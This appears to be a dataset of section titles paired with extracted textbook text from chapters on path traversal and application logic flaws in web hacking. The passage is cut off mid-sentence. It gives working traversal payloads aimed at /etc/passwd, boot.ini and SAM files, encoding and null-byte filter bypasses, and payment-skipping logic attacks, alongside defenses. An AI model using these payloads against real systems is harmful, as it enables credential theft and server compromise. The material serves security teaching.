    "output": "70779c10.qxd:WileyRed 9/14/07 3:13 PM Page 333\nCHAPTER\n10\nExploiting Path Traversal\nMany kinds of functionality oblige a web application to read from or write to\na file system on the basis of parameters supplied within user requests. If these\noperations are carried out in an unsafe manner, an attacker can submit crafted\ninput which causes the application to access files that the application designer\ndid not intend it to access. Known as path traversalvulnerabilities, such defects\nmay enable the attacker to read sensitive data including passwords and appli-\ncation logs, or to overwrite security-critical items such as configuration files\nand software binaries. In the most serious cases, the vulnerability may enable\nan attacker to completely compromise both the application and the underlying\noperating system.\nPath traversal flaws are sometimes subtle to detect, and many web applica-\ntions implement defenses against them that may be vulnerable to bypasses.\nWe will describe all of the various techniques you will need, from identifying\npotential targets, to probing for vulnerable behavior, to circumventing the\napplication’s defenses.\nCommon Vulnerabilities\nPath traversal vulnerabilities arise when user-controllable data is used by the\napplication to access files and directories on the application server or other\nback-end file system in an unsafe way. By submitting crafted input, an attacker\n333\n70779c10.qxd:WileyRed 9/14/07 3:13 PM Page 334\n334 Chapter 10 ■ Exploiting Path Traversal\nmay be able to cause arbitrary content to be read from, or written to, anywhere\non the file system being accessed. This often enables an attacker to read sensi-\ntive information from the server, or overwrite sensitive files, leading ulti-\nmately to arbitrary command execution on the server.\nConsider the following example, in which an application uses a dynamic\npage to return static images to the client. The name of the requested image is\nspecified in a query string parameter:\nhttps://wahh-app.com/scripts/GetImage.aspx?file=diagram1.jpg\nWhen the server processes this request, it performs the following steps:\n1. Extracts the value of the fileparameter from the query string.\n2. Appends this value to the prefix C:\\wahh-app\\images\\.\n3. Opens the file with this name.\n4. Reads the file’s contents and returns it to the client.\nThe vulnerability arises because an attacker can place path traversal\nsequences into the filename in order to backtrack up from the image directory\nspecified in step 2 and so access files from anywhere on the server. The path\ntraversal sequence is known as “dot-dot-slash,” and a typical attack would\nlook like this:\nhttps://wahh-app.com/scripts/GetImage.aspx?file=..\\..\\windows\\repair\\sam\nWhen the application appends the value of the fileparameter to the name\nof the images directory, it obtains the following path:\nC:\\wahh-app\\images\\..\\..\\winnt\\repair\\sam\nThe two traversal sequences effectively step back up from the images direc-\ntory to the root of the C: drive, and so the preceding path is equivalent to this:\nC:\\winnt\\repair\\sam\nHence, instead of returning an image file, the server actually returns the\nrepair copy of the Windows SAM file. This file may be analyzed by the\nattacker to obtain usernames and passwords for the server operating system.\nIn this simple example, the application implements no defenses to prevent\npath traversal attacks. However, because these attacks have been widely\nknown about for some time, it is common to encounter applications that\nimplement various defenses against them, often based on input validation fil-\nters. As you will see, these filters are often poorly designed and can be\nbypassed by a skilled attacker."
  },
  {
    "input": "Finding and Exploiting Path Traversal Vulnerabilities",
    "output": "70779c10.qxd:WileyRed 9/14/07 3:13 PM Page 335\nChapter 10 ■ Exploiting Path Traversal 335\nFinding and Exploiting Path\nTraversal Vulnerabilities\nPath traversal vulnerabilities are often subtle and hard to detect, and it may be\nnecessary to prioritize your efforts on locations within the application that are\nmost likely to manifest the vulnerability.\nLocating Targets for Attack\nDuring your initial mapping of the application, you should already have iden-\ntified any obvious areas of attack surface in relation to path traversal vulnera-\nbilities. Any functionality whose explicit purpose is uploading or downloading\nfiles should be thoroughly tested. This functionality is often found in workflow\napplications where users can share documents, in blogging and auction appli-\ncations where users can upload images, and in informational applications\nwhere users can retrieve documents such as ebooks, technical manuals, and\ncompany reports.\nIn addition to obvious target functionality of this kind, there are various\nother types of behavior that may suggest relevant interaction with the file\nsystem.\nHACK STEPS\n■ Review the information gathered during application mapping to identify:\n■ Any instance where a request parameter appears to contain the\nname of a file or directory—for example, include=main.inc or\ntemplate=/en/sidebar.\n■ Any application functions whose implementation is likely to involve\nretrieval of data from a server file system (as opposed to a back-end\ndatabase)—for example, the displaying of office documents or\nimages.\n■ During all testing which you perform in relation to every other kind of\nvulnerability, look for error messages or other anomalous events that are\nof interest. Try to find any evidence of instances where user-supplied\ndata is being passed to file APIs or as parameters to operating system\ncommands.\nNOTE If you have local access to the application (either in a white-box testing\nexercise or because you have compromised the server’s operating system),\nidentifying targets for path traversal testing is usually straightforward, because\nyou can monitor all file system interaction performed by the application.\n70779c10.qxd:WileyRed 9/14/07 3:13 PM Page 336\n336 Chapter 10 ■ Exploiting Path Traversal\nHACK STEPS\nIf you have local access to the web application:\n■ Use a suitable tool to monitor all file system activity on the server. For\nexample, the FileMon tool from SysInternals can be used on the Win-\ndows platform, the ltrace/stracetools can be used on Linux, and the\ntrusscommand can be used on Sun’s Solaris.\n■ Test every page of the application by inserting a single unique string (such\nas traversaltest) into each submitted parameter (including all cookies,\nquery string fields, and POSTdata items). Target only one parameter at a\ntime, and use the automated techniques described in Chapter 13 to speed\nup the process.\n■ Set a filter in your file system monitoring tool to identify all file system\nevents that contain your test string.\n■ If any events are identified where your test string has been used as or\nincorporated into a file or directory name, test each instance (as described\nnext) to determine whether it is vulnerable to path traversal attacks.\nDetecting Path Traversal Vulnerabilities\nHaving identified the various potential targets for path traversal testing,\nyou need to test every instance individually to determine whether user-\ncontrollable data is being passed to relevant file system operations in an\nunsafe manner.\nFor each user-supplied parameter being tested, determine whether traversal\nsequences are being blocked by the application or whether they work as\nexpected. An initial test that is usually reliable is to submit traversal sequences\nin a way that does not involve stepping back above the starting directory.\nHACK STEPS\n■ Working on the assumption that the parameter you are targeting is being\nappended to a preset directory specified by the application, modify the\nparameter’s value to insert an arbitrary subdirectory and a single traver-\nsal sequence. For example, if the application submits the parameter\nfile=foo/file1.txt\nthen try submitting the value\nfile=foo/bar/../file1.txt\n70779c10.qxd:WileyRed 9/14/07 3:13 PM Page 337\nChapter 10 ■ Exploiting Path Traversal 337\nHACK STEPS (continued)\n■ If the application’s behavior is identical in the two cases, then it may be\nvulnerable. You should proceed directly to attempting to access a differ-\nent file by traversing above the start directory.\n■ If the application’s behavior is different in the two cases, then it may be\nblocking, stripping, or sanitizing traversal sequences, resulting in an\ninvalid file path. You should examine whether there are any ways of cir-\ncumventing the application’s validation filters (described in the next sec-\ntion “Circumventing Obstacles to Traversal Attacks”).\n■ The reason why this test is effective, even if the subdirectory “bar” does\nnot exist, is that most common file systems perform canonicalization of\nthe file path before attempting to retrieve it. The traversal sequence can-\ncels out the invented directory, and so the server does not check whether\nit is present.\nIf you find any instances where submitting traversal sequences without\nstepping above the starting directory does not affect the application’s behav-\nior, the next test is to attempt to traverse out of the starting directory and access\nfiles from elsewhere on the server file system.\nHACK STEPS\n■ If the application function you are attacking provides read access to a\nfile, attempt to access a known world-readable file on the operating sys-\ntem in question. Submit one of the following values as the filename\nparameter you control:\n../../../../../../../../../../../../etc/passwd\n../../../../../../../../../../../../boot.ini\nIf you are lucky, your browser will display the contents of the file you have\nrequested, as in Figure10-1.\n■ If the function you are attacking provides write access to a file, it may be\nmore difficult to verify conclusively whether the application is vulnerable.\nOne test that is often effective is to attempt to write two files, one that\nought to be writable by any user, and one which should not be writable\neven by root or Administrator. For example, on Windows platforms you\ncan try:\n../../../../../../../../../../../../writetest.txt\n../../../../../../../../../../../../windows/system32/config/sam\nContinued\n70779c10.qxd:WileyRed 9/16/07 4:25 PM Page 338\n338 Chapter 10 ■ Exploiting Path Traversal\nHACK STEPS (continued)\nOn Unix-based platforms, files that root may not write are version-\ndependent, but attempting to overwrite a directory with a file should\nalways fail, so you can try:\n../../../../../../../../../../../../tmp/writetest.txt\n../../../../../../../../../../../../tmp\nFor each pair of tests, if the application’s behavior is different in response\nto the first and second requests (for example, if the second returns an error\nmessage, while the first does not), then it is likely that the application is\nvulnerable.\n■ An alternative method for verifying a traversal flaw with write access is\nto try to write a new file within the web root of the web server and then\nattempt to retrieve this with a browser. However, this method may not\nwork if you do not know the location of the web root directory or the\nuser context in which the file access occurs does not have permission to\nwrite there.\nFigure10-1: A successful path traversal attack\nNOTE Virtually all file systems tolerate redundant traversal sequences which\nappear to try and step up above the root of the file system. Hence, it is usually\nadvisable to submit a large number of traversal sequences when probing for a\n70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 339\nChapter 10 ■ Exploiting Path Traversal 339\nflaw, as in the examples given here. It is possible that the starting directory to\nwhich your data is appended lies deep within the file system, and so using an\nexcessive number of sequences helps to avoid false negatives.\nAlso, the Windows platform tolerates both forward slashes and backslashes as\ndirectory separators, whereas Unix-based platforms tolerate only the forward\nslash. Further, some web applications filter one version but not the other. Even\nif you are completely certain that the web server is running a Unix-based\noperating systen, the application may still be calling out to a Windows-based\nback-end component. Because of this, it is always advisable to try both\nversions when probing for traversal flaws.\nCircumventing Obstacles to Traversal Attacks\nIf your initial attempts to perform a traversal attack, as described previously,\nare unsuccessful, this does not mean that the application is not vulnerable.\nMany application developers are aware of path traversal vulnerabilities and\nimplement various kinds of input validation checks in an attempt to prevent\nthem. However, those defenses are often flawed and can be bypassed by a\nskilled attacker.\nThe first type of input filter commonly encountered involves checking\nwhether the filename parameter contains any path traversal sequences, and if\nso, either rejects the request or attempts to sanitize the input to remove the\nsequences. This type of filter is often vulnerable to various attacks that use\nalternative encodings and other tricks to defeat the filter. These attacks all\nexploit the type of canonicalization problems faced by input validation mech-\nanisms, as described in Chapter 2.\nHACK STEPS\n■ Always try path traversal sequences using both forward slashes and\nbackslashes. Many input filters check for only one of these, when the file\nsystem may support both.\n■ Try simple URL-encoded representations of traversal sequences, using\nthe following encodings. Be sure to encode every single slash and dot\nwithin your input:\ndot %2e\nforward slash %2f\nbackslash %5c\nContinued\n70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 340\n340 Chapter 10 ■ Exploiting Path Traversal\nHACK STEPS (continued)\n■ Try using 16-bit Unicode–encoding:\ndot %u002e\nforward slash %u2215\nbackslash %u2216\n■ Try double URL–encoding:\ndot %252e\nforward slash %252f\nbackslash %255c\n■ Try overlong UTF-8 Unicode–encoding:\ndot %c0%2e %e0%40%ae %c0ae etc.\nforward slash %c0%af %e0%80%af %c0%2f etc.\nbackslash %c0%5c %c0%80%5c etc.\nYou can use the illegal Unicode payload type within Burp Intruder to\ngenerate a huge number of alternate representations of any given character,\nand submit this at the relevant place within your target parameter. These\nare representations that strictly violate the rules for Unicode representation\nbut are nevertheless accepted by many implementations of Unicode\ndecoders, particularly on the Windows platform.\n■ If the application is attempting to sanitize user input by removing traver-\nsal sequences, and does not apply this filter recursively, then it may be\npossible to bypass the filter by placing one sequence within another. For\nexample:\n....//\n....\\/\n..../\\\n....\\\\\nThe second type of input filter commonly encountered in defenses against\npath traversal attacks involves verifying whether the user-supplied filename\ncontains a suffix (i.e., file type) or prefix (i.e., starting directory) that the appli-\ncation is expecting. This type of defense may be used in tandem with the filters\ndescribed already.\n70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 341\nChapter 10 ■ Exploiting Path Traversal 341\nHACK STEPS\n■ Some applications check whether the user-supplied filename ends in a\nparticular file type or set of file types, and reject attempts to access any-\nthing else. Sometimes this check can be subverted by placing a URL-\nencoded null byte at the end of your requested filename, followed by a\nfile type that the application accepts. For example:\n../../../../../boot.ini%00.jpg\nThe reason this attack sometimes succeeds is that the file type check\nis implemented using an API in a managed execution environment\nin which strings are permitted to contain null characters (such as\nString.endsWith()in Java). However, when the file is actually retrieved,\nthe application ultimately uses an API in an unmanaged environment in\nwhich strings are null-terminated and so your filename is effectively\ntruncated to your desired value.\n■ A different attack against file type filtering is to use a URL-encoded new-\nline character. Some methods of file retrieval (usually on Unix-based\nplatforms) may effectively truncate your filename when a newline is\nencountered:\n../../../../../etc/passwd%0a.jpg\n■ Some applications attempt to control the file type being accessed by\nappending their own file type suffix to the filename supplied by the user.\nIn this situation, either of the preceding exploits may be effective, for the\nsame reasons.\n■ Some applications check whether the user-supplied filename starts with\na particular subdirectory of the start directory, or even a specific file-\nname. This check can of course be trivially bypassed as follows:\nwahh-app/images/../../../../../../../etc/passwd\n■ If none of the preceding attacks against input filters are successful indi-\nvidually, it may be that the application is implementing multiple types of\nfilters, and so you need to combine several of these attacks simultane-\nously (both against traversal sequence filters and file type or directory fil-\nters). If possible, the best approach here is to try to break the problem\ndown into separate stages. For example, if the request for\ndiagram1.jpg\nContinued\n70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 342\n342 Chapter 10 ■ Exploiting Path Traversal\nHACK STEPS (continued)\nis successful, but the request for\nfoo/../diagram1.jpg\nfails, then try all of the possible traversal sequence bypasses until a\nvariation on the second request is successful. If these successful traversal\nsequence bypasses don’t enable you to access /etc/passwd, probe\nwhether any file type filtering is implemented and can be bypassed, by\nrequesting\ndiagram1.jpg%00.jpg\nWorking entirely within the start directory defined by the application, try to\nprobe to understand all of the filters being implemented, and see whether\neach can be bypassed individually with the techniques described.\n■ Of course, if you have white box access to the application, then your task\nis much easier, because you can systematically work through different\ntypes of input and verify conclusively what filename (if any) is actually\nreaching the file system.\nCoping with Custom Encoding\nProbably the craziest path traversal bug that the authors have encountered\ninvolved a custom encoding scheme for filenames that were ultimately han-\ndled in an unsafe way, and demonstrated how obfuscation provides no substi-\ntute for security.\nThe application contained some workflow functionality that enabled users\nto upload and download files. The request performing the upload supplied a\nfilename parameter that was vulnerable to a path traversal attack when writ-\ning the file. When a file had been successfully uploaded, the application pro-\nvided users with a URL to download it again. There were two important\ncaveats:\n■■ The application verified whether the file to be written already existed,\nand if so, refused to overwrite it.\n■■ The URLs generated for downloading users’ files were represented\nusing a bespoke obfuscation scheme—this appeared to be a cus-\ntomized form of Base64-encoding, in which a different character set was\nemployed at each position of the encoded filename.\n70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 343\nChapter 10 ■ Exploiting Path Traversal 343\nTaken together, these caveats presented a barrier to straightforward\nexploitation of the vulnerability. First, although it was possible to write arbi-\ntrary files to the server file system, it was not possible to overwrite any exist-\ning file, and the low privileges of the web server process meant that it was not\npossible to create a new file in any interesting locations. Second, it was not pos-\nsible to request an arbitrary existing file (such as /etc/passwd) without reverse\nengineering the custom encoding, which presented a lengthy and unappealing\nchallenge.\nA little experimentation revealed that the obfuscated URLs contained the\noriginal filename string supplied by the user. For example:\n■■ test.txtbecame zM1YTU4NTY2Y.\n■■ foo/../test.txtbecame E1NzUyMzE0ZjQ0NjMzND.\nThe difference in length of the encoded URLs indicated that no path canon-\nicalization had been performed before applying the encoding. This behavior\ngave us enough of a toe-hold to exploit the vulnerability. The first step was to\nsubmit a file with the following name:\n../../../../../.././etc/passwd/../../tmp/foo\nwhich in its canonical form is equivalent to\n/tmp/foo\nand so could be written by the web server. Uploading this file produced a\ndownload URL containing the following obfuscated filename:\nFhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrMHdUbXBWZWs1NldYaE5lb\nTo modify this value to return the file /etc/passwd, we simply needed to\ntruncate it at the right point, which is\nFhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrM\nAttempting to download a file using this value returned the server’s passwd\nfile as expected. The server had given us sufficient resources to be able to\nencode arbitrary file paths using its scheme, without even deciphering the\nobfuscation algorithm being used!\nNOTE The observant may have noticed the appearance of a redundant ./in\nthe name of our uploaded file. This was necessary to ensure that our truncated\nURL ended on a 3-byte boundary of clear text, and therefore on a 4-byte\nboundary of encoded text, in line with the Base64-encoding scheme. Truncating\nan encoded URL partway through an encoded block would almost certainly\ncause an error when decoded on the server."
  },
  {
    "input": "Preventing Path Traversal Vulnerabilities",
    "output": "70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 344\n344 Chapter 10 ■ Exploiting Path Traversal\nExploiting Traversal Vulnerabilities\nHaving identified a path traversal vulnerability that provides read or write\naccess to arbitrary files on the server’s file system, what kind of attacks can\nyou carry out by exploiting these? In most cases, you will find that you have\nthe same level of read/write access to the file system as the web server process\ndoes.\nHACK STEPS\n■ You can exploit read-access path traversal flaws to retrieve interesting\nfiles from the server that may contain directly useful information or help\nyou to refine attacks against other vulnerabilities. For example:\n■ Password files for the operating system and application.\n■ Server and application configuration files, to discover other vulnerabil-\nities or fine-tune a different attack.\n■ Include files that may contain database credentials.\n■ Data sources used by the application, such as MySQL database files or\nXML files.\n■ The source code to server-executable pages, to perform a code\nreview in search of bugs (for example GetImage.aspx?file=\nGetImage.aspx).\n■ Application log files that may contain usernames and session tokens,\nand the like.\n■ If you find a path traversal vulnerability that grants write access, your\nmain goal should be to exploit this to achieve arbitrary execution of com-\nmands on the server. Means of exploiting the vulnerability to achieve this\ninclude:\n■ Creating scripts in users’ startup folders.\n■ Modifying files such as in.ftpdto execute arbitrary commands when\na user next connects.\n■ Writing scripts to a web directory with execute permissions and calling\nthem from your browser.\nPreventing Path Traversal Vulnerabilities\nBy far the most effective means of eliminating path traversal vulnerabilities is\nto avoid passing user-submitted data to any file system API. In many cases,\nincluding the original example GetImage.aspx?file=diagram1.jpg, it is\n70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 345\nChapter 10 ■ Exploiting Path Traversal 345\nentirely unnecessary for an application to do this. For most files that are not\nsubject to any access control, the files can simply be placed within the web root\nand accessed via a direct URL. If this is not possible, the application can main-\ntain a hard-coded list of image files that may be served by the page, and use a\ndifferent identifier to specify which file is required, such as an index number.\nAny request containing an invalid identifier can be rejected, and there is no\nattack surface for users to manipulate the path of files delivered by the page.\nIn some cases, as with the workflow functionality that allows file uploading\nand downloading, it may be desirable to allow users to specify files by name,\nand developers may decide that the easiest way to implement this is by pass-\ning the user-supplied filename to file system APIs. In this situation, the appli-\ncation should take a defense-in-depth approach to place several obstacles in\nthe way of a path traversal attack.\nHere are some examples of defenses that may be used; ideally, as many of\nthese as possible should be implemented together:\n■■ After performing all relevant decoding and canonicalization of the user-\nsubmitted filename, the application should check whether this contains\neither of the path traversal sequences (using backward or forward\nslashes) or any null bytes. If so, the application should stop processing\nthe request. It should not attempt to perform any sanitization on the\nmalicious filename.\n■■ The application should use a hard-coded list of permissible file types\nand reject any request for a different type (after the precedingdecoding\nand canonicalization has been performed).\n■■ After performing all of its filtering on the user-supplied filename, the\napplication should use suitable file system APIs to verify that nothing is\namiss, and that the file to be accessed using that filename is located\nwithin the start directory specified by the application.\nIn Java, this can be achieved by instantiating a java.io.Fileobject\nusing the user-supplied filename and then calling the getCanonicalPath\nmethod on this object. If the string returned by this method does not\nbegin with the name of the start directory, then the user has somehow\nbypassed the application’s input filters, and the request should be\nrejected.\nIn ASP.NET, this can be achieved by passing the user-supplied filename\nto the System.Io.Path.GetFullPathmethod and checking the returned\nstring in the same way as described for Java.\n■■ The application can mitigate the impact of most exploitable path traver-\nsal vulnerabilities by using a chrootedenvironment to access the direc-\ntory containing the files to be accessed. In this situation, the chrooted"
  },
  {
    "input": "Questions",
    "output": "70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 346\n346 Chapter 10 ■ Exploiting Path Traversal\ndirectory is treated as if it is the file system root, and any redundant tra-\nversal sequences that attempt to step up above it are ignored.\nChrootedfile systems are supported natively on most Unix-based plat-\nforms. A similar effect can be achieved on Windows platforms (in rela-\ntion to traversal vulnerabilities, at least) by mounting the relevant start\ndirectory as a new logical drive and using the associated drive letter to\naccess its contents.\n■■ The application should integrate its defenses against path traversal\nattacks with its logging and alerting mechanisms. Whenever a request\nis received that contains path traversal sequences, this indicates likely\nmalicious intent on the part of the user, and the application should log\nthe request as an attempted security breach, terminate the user’s ses-\nsion, and if applicable, suspend the user’s account and generate an alert\nto an administrator.\nChapter Summary\nPath traversal can often be a devastating vulnerability, enabling you to break\nthrough many layers of security controls to gain direct access to sensitive data,\nincluding passwords, configuration files, application logs, and source code. If\nthe vulnerability grants write access, it can quickly lead to a complete com-\npromise of the application and underlying server.\nPath traversal bugs are surprisingly common; however, they are often sub-\ntle to detect and may be protected by various kinds of input validation which\ndeflect the most obvious attacks but can nevertheless be bypassed with skill\nand determination. The most important lesson when probing for path traver-\nsal flaws is to be patient and work systematically to try to understand pre-\ncisely how your input is being handled, and how the server’s processing can\nbe manipulated to achieve success.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. You insert a standard path traversal detection string into the\nfollowing URL:\nhttps://wahh-app.com/logrotate.pl?file=../../../../../etc/passwd\n70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 347\nChapter 10 ■ Exploiting Path Traversal 347\nThe application returns the following error message:\npasswd.log not found in /etc directory!\nWhat input should you submit next to try to retrieve the passwdfile?\n2. You are probing for path traversal flaws in a file download function.\nThe following URL returns the file called foo.txt:\nhttps://wahh-app.com/showFile.php?f=foo.txt\nAfter some experimentation, you discover that supplying the input\n../foo.txtreturns the original file, whereas supplying the input\nbar/../foo.txtreturns an error.\nWhat might be the cause of this unusual behavior, and how can you\nattempt to refine your attack?\n3. An application uses URLs like the following to view various configura-\ntion files:\nhttps://wahh-app.com/manage/customize.asp?file=default.xml\nYou have determined that the file specified is normally retrieved from\nthe /contribdirectory within the web root. However, requesting the\nfollowing URL:\nhttps://wahh-app.com/manage/customize.asp?file=../../../../boot.ini\nresults in an HTTP 500 status code and the following error message:\nMicrosoft VBScript runtime (0x800A0046)\nPermission denied\nWhat is the likely cause of this message, and how can you proceed\ntowards exploitation?\n4. You have located a file handling function that appears to be vulnerable\nto path traversal attacks. However, you have no idea what the location\nof the starting directory is, or how many traversal sequences you need\nto insert to get to the file system root. How can you proceed without\nthis information?\n5. You have located a path traversal vulnerability. However the starting\ndirectory is within a separate logical volume that is only used for\nhosted web content. Is it possible to exploit this vulnerability to any\nmalicious effect?\n70779c10.qxd:WileyRed 9/14/07 3:14 PM Page 348"
  },
  {
    "input": "Chapter 11: Attacking Application Logic",
    "output": "70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 349\nCHAPTER\n11\nAttacking Application Logic\nAll web applications employ logic in order to deliver their functionality. Writ-\ning code in a programming language involves at its root nothing more than\nbreaking down a complex process into very simple and discrete logical steps.\nTranslating a piece of functionality that is meaningful to human beings into\na sequence of small operations that can be executed by a computer involves a\ngreat deal of skill and discretion. Doing it in an elegant and secure fashion is\neven harder still. When large numbers of different designers and program-\nmers work in parallel on the same application, there is ample opportunity for\nmistakes to occur.\nIn all but the very simplest of web applications, a vast amount of logic is\nperformed at every stage. This logic presents an intricate attack surface that\nis always present but often overlooked. Many code reviews and penetration\ntests focus exclusively on the common “headline” vulnerabilities like SQL\ninjection and cross-site scripting, because these have an easily recognizable\nsignature and well-researched exploitation vector. By contrast, flaws in an\napplication’s logic are harder to characterize: each instance may appear to be a\nunique one-off occurrence, and they are not usually identified by any auto-\nmated vulnerability scanners. As a result, they are not generally as well appre-\nciated or understood, and they are therefore of great interest to an attacker.\nIn this chapter, we will describe the kinds of logic flaws that often exist in web\napplications and the practical steps that you can take to probe and attack an\napplication’s logic. We will present a series of real-world examples, each of which\n349"
  },
  {
    "input": "Real-World Logic Flaws",
    "output": "70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 350\n350 Chapter 11 ■ Attacking Application Logic\nmanifests a different kind of logical defect and which together serve to illustrate\nthe variety of assumptions made by designers and developers that can lead\ndirectly to faulty logic, and expose an application to security vulnerabilities.\nThe Nature of Logic Flaws\nLogic flaws in web applications are extremely varied. They range from simple\nbugs manifested in a handful of lines of code, to extremely complex vulnera-\nbilities arising from the interoperation of several core components of the appli-\ncation. In some instances, they may be obvious and trivial to detect; in other\ncases, they may be exceptionally subtle and liable to elude even the most rig-\norous code review or penetration test.\nUnlike other coding flaws such as SQL injection or cross-site scripting,\nthere is no common “signature” associated with logic flaws. The defining\ncharacteristic, of course, is that the logic implemented within the application\nis defective in some way. In many cases, the defect can be represented in\nterms of a specific assumption that has been made in the thinking of the\ndesigner or developer, either explicitly or implicitly, and that turns out to be\nflawed. In general terms, a programmer may have reasoned something like\n“If A happens, then B must be the case, so I will do C.” The programmer did\nnot ask the entirely different question “But what if X occurs?” and so failed\nto take account of a scenario that violates the assumption. Depending on the\ncircumstances, this flawed assumption may open up a significant security\nvulnerability.\nAs awareness of common web application vulnerabilities has increased in\nrecent years, the incidence and severity of some categories of vulnerability\nhave declined noticeably. However, because of the nature of logic flaws, it is\nunlikely that they will ever be completely eliminated via standards for secure\ndevelopment, use of code-auditing tools, or normal penetration testing. The\ndiverse nature of logic flaws, and the fact that detecting and preventing them\noften requires a good measure of lateral thinking, suggests that they will be\nprevalent for a good while to come. Any serious attacker, therefore, needs to\npay serious attention to the logic employed in the application being targeted,\nto try to figure out the assumptions that designers and developers are likely to\nhave made, and then to think imaginatively about how those assumptions\nmay be violated.\nReal-World Logic Flaws\nThe best way to learn about logic flaws is not by theorizing, but through\nacquaintance with some actual examples. Although individual instances of\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 351\nChapter 11 ■ Attacking Application Logic 351\nlogic flaws differ hugely, they share many common themes, and they demon-\nstrate the kinds of mistake that human developers will always be prone to\nmaking. Hence, insights gathered from studying a sample of logic flaws\nshould help you to uncover new flaws in entirely different situations.\nExample 1: Fooling a Password Change Function\nThe authors have encountered this logic flaw in a web application imple-\nmented by a financial services company and also in the AOL AIM Enterprise\nGateway application.\nThe Functionality\nThe application implemented a password change function for end users. It\nrequired the user to fill out fields for username, existing password, new pass-\nword, and confirm new password.\nThere was also a password change function for use by administrators. This\nallowed them to change the password of any user without the need to supply\nthe existing password. The two functions were implemented within the same\nserver-side script.\nThe Assumption\nThe client-side interface presented to users and administrators differed in one\nrespect—the administrator’s interface did not contain a field for an existing\npassword. When the server-side application processed a password change\nrequest, it used the presence or absence of the existing password parameter to\nindicate whether the request was from an administrator or an ordinary user. In\nother words, it assumed that ordinary users would always supply an existing\npassword parameter.\nThe code responsible looked something like this:\nString existingPassword = request.getParameter(“existingPassword”);\nif (null == existingPassword)\n{\ntrace(“Old password not supplied, must be an administrator”);\nreturn true;\n}\nelse\n{\ntrace(“Verifying user’s old password”);\n...\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 352\n352 Chapter 11 ■ Attacking Application Logic\nThe Attack\nOnce the assumption has been explicitly stated in this way, the logic flaw\nbecomes obvious. Of course, an ordinary user can issue a request that does not\ncontain an existing password parameter, because users control every aspect of\nthe requests they issue.\nThis logic flaw was devastating for the application. It enabled an attacker to\nreset the password of any other user and so take full control of their account.\nHACK STEPS\n■ When probing key functionality for logic flaws, try removing in turn each\nparameter submitted in requests, including cookies, query string fields,\nand items of POSTdata.\n■ Be sure to delete the actual name of the parameter as well as its value.\nDo not just submit an empty string, as this is typically handled differently\nby the server.\n■ Attack only one parameter at a time, to ensure that all relevant code\npaths within the application are reached.\n■ If the request you are manipulating is part of a multistage process, fol-\nlow the process through to completion, because some later logic may\nprocess data that was supplied in earlier steps and stored within the\nsession.\nExample 2: Proceeding to Checkout\nThe authors encountered this logic flaw in the web application employed by\nan online retailer.\nThe Functionality\nThe process of placing an order involved the following stages:\n1. Browse the product catalog and add items to the shopping basket.\n2. Return to the shopping basket and finalize the order.\n3. Enter payment information.\n4. Enter delivery information.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 353\nChapter 11 ■ Attacking Application Logic 353\nThe Assumption\nThe developers assumed that users would always access the stages in the\nintended sequence, because this was the order in which the stages are deliv-\nered to the user by the navigational links and forms presented to their browser.\nHence, any user who completed the order process must have submitted satis-\nfactory payment details along the way.\nThe Attack\nThe developers’ assumption was flawed for fairly obvious reasons. Users con-\ntrol every request that they make to the application and so can access any stage\nof the ordering process in any sequence. By proceeding directly from stage 2 to\nstage 4, an attacker could generate an order that was finalized for delivery but\nthat had not actually been paid for.\nHACK STEPS\nThe technique for finding and exploiting flaws of this kind is known as forced\nbrowsing. This involves circumventing any controls imposed by in-browser\nnavigation on the sequence in which application functions may be accessed:\n■ When a multistage process involves a defined sequence of requests,\nattempt to submit these requests out of the expected sequence. Try skip-\nping certain stages altogether, accessing a single stage more than once,\nand accessing earlier stages after later ones.\n■ The sequence of stages may be accessed via a series of GETor POST\nrequests for distinct URLs, or they may involve submitting different sets\nof parameters to the same URL. The stage being requested may be speci-\nfied by submitting a function name or index within a request parameter.\nBe sure to understand fully the mechanisms that the application is\nemploying to deliver access to distinct stages.\n■ From the context of the functionality that is implemented, try to under-\nstand what assumptions may have been made by developers and where\nthe key attack surface lies. Try to identify ways of violating those\nassumptions to cause undesirable behavior within the application.\n■ When multistage functions are accessed out of sequence, it is common\nto encounter a variety of anomalous conditions within the application,\nsuch as variables with null or uninitialized values, a partially defined or\ninconsistent state, and other unpredictable behavior. In this situation, the\napplication may return interesting error message and debug output,\nwhich can be used to better understand its internal workings and thereby\nfine-tune the current or a different attack (see Chapter 14). Sometimes,\nthe application may get into a state entirely unanticipated by developers,\nwhich may lead to serious security flaws.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 354\n354 Chapter 11 ■ Attacking Application Logic\nNOTE Many types of access control vulnerability are similar in nature\nto this logic flaw. When a privileged function involves multiple stages that are\nnormally accessed in a defined sequence, the application may assume that\nusers will always proceed through the functionality in this sequence. The\napplication may enforce strict access control on the initial stages of the process\nand assume that any user who reaches the later stages must, therefore, be\nauthorized. If a low-privileged user proceeds directly to a later stage, she may\nbe able to access it without any restrictions. See Chapter 8 for more details\non finding and exploiting vulnerabilities of this kind.\nExample 3: Rolling Your Own Insurance\nThe authors encountered this logic flaw in a web application deployed by a\nfinancial services company.\nThe Functionality\nThe application enabled users to obtain quotations for insurance, and if desired,\ncomplete and submit an insurance application online. The process was spread\nacross a dozen stages, as follows:\n■■ At the first stage, the applicant submits some basic information, and\nspecifies either a preferred monthly premium or the value the applicant\nwishes insurance for. The application offers a quotation, computing\nwhichever value the applicant did not specify.\n■■ Across several stages, the applicant supplies various other personal\ndetails, including health, occupation, and pastimes.\n■■ Finally, the application is transmitted to an underwriter working for the\ninsurance company. Using the same web application, the underwriter\nreviews the details and decides whether to accept the application as is,\nor modify the initial quotation to reflect any additional risks.\nThrough each of the stages described, the application employed a shared\ncomponent to process each parameter of user data submitted to it. This com-\nponent parsed out all of the data in each POSTrequest into 